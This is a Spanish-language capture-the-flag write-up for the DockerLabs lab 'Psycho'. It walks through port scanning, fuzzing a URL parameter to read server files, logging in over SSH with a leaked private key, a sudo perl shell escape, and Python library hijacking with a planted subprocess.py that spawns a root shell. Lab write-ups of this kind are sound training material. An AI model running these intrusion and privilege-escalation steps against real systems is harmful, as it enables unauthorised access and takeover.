---
title: DockerLabs - Psycho
author: elcybercurioso
date: 2025-10-27 13:00
categories: [Post, DockerLabs]
tags: [fácil, ]
media_subpath: "/assets/img/posts/dockerlabs_psycho"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 00:40 GMT
Initiating ARP Ping Scan at 00:40
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:40, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:40
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:40, 10.21s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.000056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65556 (2.626MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -sCV -p22,80 172.17.0.2                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 00:40 GMT
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.000059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 4You
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

## análisis

Revisando la pagina principal del puerto 80, encontramos un error que salta a la vista al final de la misma:

![Desktop View](/20251027015538.webp){: width="972" height="589" .shadow}

Posiblemente reaccione en base a si se le ha pasado un cierto parámetro a la URL. Por ello, buscamos si con alguna cadena responde de otra forma:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Psycho]
└─$ wfuzz -c --hc=404 --hh=2596 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2?FUZZ=test" -t 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2?FUZZ=whoami/
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                             
=====================================================================

000005155:   200        62 L     166 W      2582 Ch     "secret"
```

En este caso, con el parámetro `secret` vemos que podemos llegar a leer fichero del servidor:

![Desktop View](/20251027015432.webp){: width="972" height="589" .shadow}

![Desktop View](/20251027015621.webp){: width="972" height="589" .shadow}

## explotación

Buscamos ficheros que nos puedan dar acceso al servidor, y encontramos que el usuario `vaxei` tiene en su directorio una clave privada, la cual podemos usar para acceder por SSH:

![Desktop View](/20251027125955.webp){: width="972" height="589" .shadow}

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Psycho]
└─$ ssh -i id_rsa vaxei@172.17.0.2
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1
vaxei@88b8cebfc8cd:~$ whoami
vaxei
```

Listando los permisos SUDO del usuario vemos que puede ejecutar `perl` con los permisos del usuario `luisillo`:

```bash
vaxei@88b8cebfc8cd:~$ sudo -l
Matching Defaults entries for vaxei on 88b8cebfc8cd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User vaxei may run the following commands on 88b8cebfc8cd:
    (luisillo) NOPASSWD: /usr/bin/perl
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo) vemos que podemos obtener una consola como otro usuario si tenemos permisos SUDO usando `perl`:

![Desktop View](/20251027020757.webp){: width="972" height="589" .shadow}

Ejecutamos la instrucción indicada, y ya tendríamos acceso como el usuario `luisillo`:

```bash
vaxei@88b8cebfc8cd:~$ sudo -u luisillo perl -e 'exec "/bin/bash";'
luisillo@88b8cebfc8cd:/home/vaxei$ whoami
luisillo
```

## escalada de privilegios

Revisamos los permisos SUDO de este usuario también, y vemos que en este caso, lo que puede hacer es ejecutar con `python` un cierto script:

```bash
luisillo@88b8cebfc8cd:/home/vaxei$ sudo -l
Matching Defaults entries for luisillo on 88b8cebfc8cd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 88b8cebfc8cd:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

El contenido del script es:

```python
luisillo@88b8cebfc8cd:/opt$ cat paw.py 
import subprocess
import os
import sys
import time

# F
def dummy_function(data):
    result = ""
    for char in data:
        result += char.upper() if char.islower() else char.lower()
    return result

# Código para ejecutar el script
os.system("echo Ojo Aqui")

# Simulación de procesamiento de datos
def data_processing():
    data = "This is some dummy data that needs to be processed."
    processed_data = dummy_function(data)
    print(f"Processed data: {processed_data}")

# Simulación de un cálculo inútil
def perform_useless_calculation():
    result = 0
    for i in range(1000000):
        result += i
    print(f"Useless calculation result: {result}")

def run_command():
    subprocess.run(['echo Hello!'], check=True)

def main():
    # Llamadas a funciones que no afectan el resultado final
    data_processing()
    perform_useless_calculation()
    
    # Comando real que se ejecuta
    run_command()

if __name__ == "__main__":
    main()
```

Vemos que al ejecutarlo nos da un cierto error, el cual nos da una pista de como podemos obtener acceso como `root`:

```bash
luisillo@88b8cebfc8cd:/home/vaxei$ sudo /usr/bin/python3 /opt/paw.py
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
Traceback (most recent call last):
  File "/opt/paw.py", line 41, in <module>
    main()
  File "/opt/paw.py", line 38, in main
    run_command()
  File "/opt/paw.py", line 30, in run_command
    subprocess.run(['echo Hello!'], check=True)
  File "/usr/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
```

Sabemos que podemos llegar a listar el listado de ubicaciones donde se buscan las librerías que usa `python` al ejecutar un script:

```bash
luisillo@88b8cebfc8cd:/opt$ python3 -c "import sys; print(sys.path)"
['', '/usr/lib/python312.zip', '/usr/lib/python3.12', '/usr/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/dist-packages', '/usr/lib/python3/dist-packages']
```

Debido a que la primera ubicación por defecto es en la que nos encontramos en el momento de ejecutar un script, podemos llegar a efectuar lo que se conoce como `Python library hijacking`, donde el objetivo es crear un fichero que contenga las instrucciones que queramos, pero que se llame igual a una librería oficial de `python`:

```bash
luisillo@88b8cebfc8cd:/opt$ cat subprocess.py 
import os; os.system("/bin/bash")
```

De esta forma, tras ejecutar el comando de los permisos SUDO, obtendríamos una consola como el usuario `root`:

```bash
luisillo@88b8cebfc8cd:/opt$ sudo /usr/bin/python3 /opt/paw.py
root@88b8cebfc8cd:/opt# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>